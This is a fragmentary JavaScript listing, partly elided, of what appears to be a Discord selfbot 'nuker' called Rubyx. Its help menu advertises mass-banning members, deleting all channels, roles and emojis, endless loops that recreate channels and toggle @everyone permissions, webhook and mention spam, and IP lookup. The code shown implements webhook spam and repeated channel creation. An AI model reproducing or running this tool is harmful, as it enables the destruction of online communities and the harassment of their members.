					...
					if (marcos34 === 'token') {
						...
						if (marcos34 === 'emoji') {
							...
							if (marcos34 === 'live') {
								...
								client.user.setActivity(fuck, {
									type: 'STREAMING',
									url: 'https://youtube.com/c/YLuck#0001'
								});
								console.log(chalk.yellow('     [+] Nova live adicionada'))
							} else {
								if (marcos34 === 'help') {
									pipoca.delete();
									var piranha = new Discord.MessageEmbed().setTitle('Rubyx/Team').setImage('https://cdn.discordapp.com/attachments/608711485849337856/916770334017994843/akame-kurome_2.gif').setColor('RANDOM').setDescription(`${'Pega:'}`).addField(`${''}${prefix}${'spam'}`, `${'Spam kk'}`).addField(`${''}${prefix}${'emoji'}`, `${'Apaga todos os emojis'}`).addField(`${''}${prefix}${'jogo'}`, `${'Coloca uma nova atividade de jogo'}`).addField(`${''}${prefix}${'live'}`, `${'Perfil roxo'}`).addField(`${''}${prefix}${'mudarn'}`, `${'Muda o nome de geral'}`).addField(`${''}${prefix}${'canais'}`, `${'Muda o nome de todos os canais'}`).addField(`${''}${prefix}${'cargos'}`, `${'Muda o nome de todos os cargos'}`).addField(`${''}${prefix}${'ban'}`, `${'Ban na maioria dos membros'}`).addField(`${''}${prefix}${'ip'}`, `${'Retorna informacoes do ip'}`).addField(`${''}${prefix}${'webhook'}`, `${'Faz spam com uma webhook'}`).addField(`${''}${prefix}${'clear'}`, `${'Limpa todas as suas mensagens'}`).addField(`${''}${prefix}${'bug'}`, `${'Loop infinito de apagar e criar canais, ninguém escreve hoje xD'}`).addField(`${''}${prefix}${'dr'}`, `${'Deleta todos os cargos'}`).addField(`${''}${prefix}${'dc'}`, `${'Deleta todos os canais'}`).addField(`${''}${prefix}${'cw'}`, `${'Cria um canal e faz spam usando uma webhook'}`).addField(`${''}${prefix}${'perms'}`, `${'Loop infinito removendo e adicionando permissões do everyone'}`).addField(`${''}${prefix}${'random'}`, `${'Faz spam por menção em um membro (pv/server)'}`);
									pipoca.channel.send(piranha)
								} else {
									if (marcos34 === 'canais') {
										pipoca.delete();
...
\
        Regiao: `}${meianoite .body  .region }${''}`);
													...
													if (marcos34 === 'webhook') {
														let fuck = ola34.join(' ');
														pipoca.delete();
														let webhookkkkkkkkkkkk = pipoca.channel.createWebhook('Rubyx', {
                                  ...
                                  if (gloria_a_deus === 0) {
                                    ...
                                    if (gloria_a_deus === 1) {
                                      for (pas = 0; pas < 10; pas++) {
                                        pipoca .guild  .channels  .create ('Rubyx está ta presente', {
                                          type: 'text'
                                        })
                                      };
                                      gloria_a_deus = 2
